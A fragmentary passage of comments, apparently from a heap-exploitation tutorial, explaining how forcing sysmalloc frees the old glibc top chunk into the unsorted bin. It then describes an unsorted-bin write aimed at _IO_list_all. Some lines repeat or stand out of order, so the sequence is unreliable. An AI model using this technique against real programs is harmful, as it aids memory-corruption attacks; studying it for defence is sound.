       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.
       
       In the usual scenario, the heap looks like the following
          |--------------|-----------|------...----|
          |      chunk   |    chunk  |Top   ...    |
          |--------------|-----------|------...----|
      heap start                                heap end
       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
       In order to keep track of this change in size, malloc uses a fencepost chunk.
       which is basically a temporary chunk.
       After the size of the Top chunk has been updated, this chunk gets freed.
       In our scenario however, the heap looks like
         |------------|------------|------..--|--...--|---------|
         |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
         |------------|------------|------..--|--...--|---------|
     heap start                                   heap end
       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free

      that gets mmapped. It will be placed after the old heap's end

      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with an address in the arena.
      This happens only when the size requested is of smallbin size.
      Note that this overwrite occurs before the sanity check and therefore will occur.
      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
